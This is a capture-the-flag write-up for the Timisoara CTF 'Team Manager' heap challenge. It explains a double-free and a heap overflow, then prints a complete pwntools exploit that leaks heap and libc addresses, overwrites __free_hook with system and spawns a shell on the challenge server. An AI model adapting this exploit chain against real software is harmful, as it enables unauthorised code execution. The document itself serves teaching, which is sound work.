---
title: "Team Manager [300]"
tags: [Timisoara CTF, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Binary Exploitation 

> I found the team manager service used for Timisoara CTF. Do you think it is secure?  
nc 89.38.208.144 11114

## Write-up
Running the binary instantly shows this is a standard heap challenge:
```
Welcome to the Timctf Team Manager
1: Add player
2: Remove player
3: Edit player
4: View player
5: View team
0: Exit
```

After analyzing the binary using Ghidra, a few observations can be made:
* Chunks on the heap can be freed multiple times without checks. There is a double free() vulnerability, which leaks an address pointing to the heap.
* Input is vulnerable to a heap overflow. By overflowing the "comments" section for one chunk, we can overwrite addresses on the following chunk.

The exploit follows the following order:

1. **Leak heap address**  
Leak the heap address using the double free() vulnerability. The address is stored in the "reversing and exploitation" and "crypto" areas in the heap. Viewing the team outputs the leaked heap address.

2. **Leak printf address**  
Using the heap overflow, overwrite the pointer to the "comments" section in the second chunk with the address of `printf` in the `GLOBAL OFFSET TABLE (GOT)`.Viewing the second player outputs the leaked `printf` address.

3. **Calculate libc base**  
Standard ret2libc procedure. Libc base can be calculated using `printf - printf_offset`, where `printf` is the leaked address and `printf_offset` is the address of `printf` in libc. With libc base value, the address of `__free_hook` and `system` can be calculated using `libc_base + system_offset` and `libc_base + __free_hook_offset` respectively.

4. **Overwrite __FREE_HOOK pointer with system**  
Overwrite the pointer to the "comments" section in the second chunk with the address of `__free_hook`. This makes the pointer point to the `__free_hook` instead. `__free_hook` can then be overwritten with the address of `system` by editing the "comments" of the second chunk. Calling free() now calls system() instead.

5. **Write /bin/sh into heap address**
Write the string `/bin/sh\x00` (*0x0068732f6e69622f* in hex) into the leaked heap address. The argument for free() is stored in this address when free() is called. When calling free() on first chunk, system(/bin/sh) is called instead, which executes a shell.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./timctf_manager",
    "libc" : "./libc-2.27.so",
    "ld" : "./ld-2.27.so",
    "HOST" : "89.38.208.144",
    "PORT" : 11114,
}

def add(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "1")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def remove(pid):
	sla("0: Exit", "2")
	sla("Enter player id (1-4) ", str(pid))

def edit(pid, name, reversing, web, crypto, forensics, comment):
	sla("0: Exit", "3")
	sla("Enter player id (1-4) ", str(pid))
	sla("Player's name: ", name)
	sla("Player's skill at reversing and exploitation: ", str(reversing)) 
	sla("Player's skill at web exploit: ", str(web))
	sla("Player's skill at crypto: ", str(crypto))
	sla("Player's skill at forensics: ", str(forensics))
	sla("Extra note/comment: ", comment)

def viewplayer(pid):
	sla("0: Exit", "4")
	sla("Enter player id (1-4) ", str(pid))

def viewteam():
	sla("0: Exit", "5")

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def exploit(p):
	print_menu = 0x00400827
	printf_got = elf.got['printf']
	data  = elf.get_section_by_name(".data").header.sh_addr

	add(1, "", 1, 2, 3, 4, "")
	add(2, "", 1, 2, 3, 4, "")
	remove(1)
	remove(1)
	viewteam()

	ru('reversing and exploitation: ')
	lo = int(p.recvline().strip())
	lo = str(tohex(lo, 32))[2:]
	ru("crypto: ")
	hi = str(hex(int(p.recvline().strip())))
	leak = int(hi + lo, 16)

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(printf_got)

	edit(1, "", 1, 1, 1, 1, payload)
	viewplayer(2)
	ru("Extra note/comment: ")

	printf = u64(r(8))
	base = printf - libc.symbols['printf']
	free_hook = base + libc.symbols['__free_hook']
	system = base + libc.symbols['system']
	
	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(free_hook)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(system))

	payload = "\x90"*264 + p64(0x61) + p32(2)*4 + p64(leak)
	edit(1, "", 1, 1, 1, 1, payload)
	edit(2, "", 2, 2, 2, 2, p64(0x0068732f6e69622f))
	remove(1)
	
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```

**Flag:** TIMCTF{Heap_overfl0ws_are_really_B4D}